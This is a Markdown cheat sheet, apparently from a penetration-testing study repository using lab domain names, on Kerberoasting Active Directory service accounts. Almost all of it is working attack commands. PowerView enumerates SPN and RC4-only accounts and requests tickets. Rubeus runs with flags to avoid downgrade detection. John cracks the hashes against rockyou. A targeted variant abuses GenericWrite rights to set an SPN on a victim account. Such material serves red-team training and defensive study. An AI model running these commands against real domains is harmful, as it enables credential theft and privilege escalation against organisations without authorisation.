# Methodology
> 1. Enumerate what user account running as a service account we want to kerberoast.
> 2. Make sure it's not a honey pot account.
> 3. Make sure is a user made account, we don't want machine accounts since they have long passwords.
> 4. If OPSEC is needed kerberoast RC4-only accounts and add a delay between requesting tickets.
> 5. Kerberoast the user account.
> 6. Make sure we get back a RC4 hash and not an AES256 hash.
> 7. Crack the ticket. 
---
# PowerShell
>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).

## PowerView
**Find users that have an SPN set:**

```powershell
Get-DomainUser -SPN | select cn, serviceprincipalname
```

**Find users that have an SPN set and are RC4-only:**
```powershell
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes | 
Where-Object {
    # Accounts that explicitly only support RC4 (0x17)
    ($_.'msds-supportedencryptiontypes' -eq 4) -or
    # Accounts with no encryption type specified (default to RC4)
    ($_.'msds-supportedencryptiontypes' -eq $null) -or
    # Accounts with encryption type set to 0 (default to RC4)
    ($_.'msds-supportedencryptiontypes' -eq 0)
} | Format-Table samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

**Request a ticket:**
```powershell
# With SPN
Request-SPNTicket -SPN "HTTP/eyrie.north.sevenkingdoms.local" | Select-Object -ExpandProperty hash

# With account name
Get-DomainUser -Identity "sansa.stark" -SPN | Get-DomainSPNTicket | Select-Object -ExpandProperty hash

# Get all SNP account hashes. WARNING: EXTREMELY NOSIY!
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty hash | Out-File -FilePath .\spn_hashes.txt
```
---

# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).
## Rubeus
**Request a ticket:**
```cmd
# With account name
Rubeus.exe kerberoast /user:serviceaccount /simple

# RC4-Only account (Avoids downgrade detection, skips AES supported tickets)
Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec

# Get all SNP account hashes. WARNING: EXTREMELY NOISY!
Rubeus.exe kerberoast /simple
```


# Ticket Crack
https://www.openwall.com/john/k/john-1.9.0-jumbo-1-win64.zip

**Using John**:
```cmd
john-1.9.0-jumbo-1-win64\run\john.exe -- wordlist=rockyou.txt spn_hash.txt
```


# Targeted Kerberoasting
If we have sufficient rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain) instead of changing the password.
## Methodology
> 1. Check if we have Generic All/Generic Write over another user by checking groups it belongs to.
> 2. Check if the user already has an SPN.
> 3. Set the SPN.
> 4. Kerberoast the user account.
> 5. Make sure we get back a RC4 hash and not an AES256 hash.
> 6. Crack the ticket. 

**Search for GenericAll/GenericWrite:**
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | 
Where-Object {
    ($_.ActiveDirectoryRights -match "GenericAll|GenericWrite") -and
    ($_.IdentityReferenceName -match "StudentUsers")
} | Select-Object ObjectDN,ActiveDirectoryRights,IdentityReferenceName
```

**Check if the user has an SPN:**
```powershell
Get-DomainUser -Identity supportXuser | select serviceprincipalname
```

**Set the SPN:**
```powershell
Set-DomainObject -Identity supportXuser -Set @{serviceprincipalname='us/myspnX'} -Verbose
```

**Request the ticket:**
```cmd
Rubeus.exe kerberoast /user:supportXuser /simple /rc4opsec
```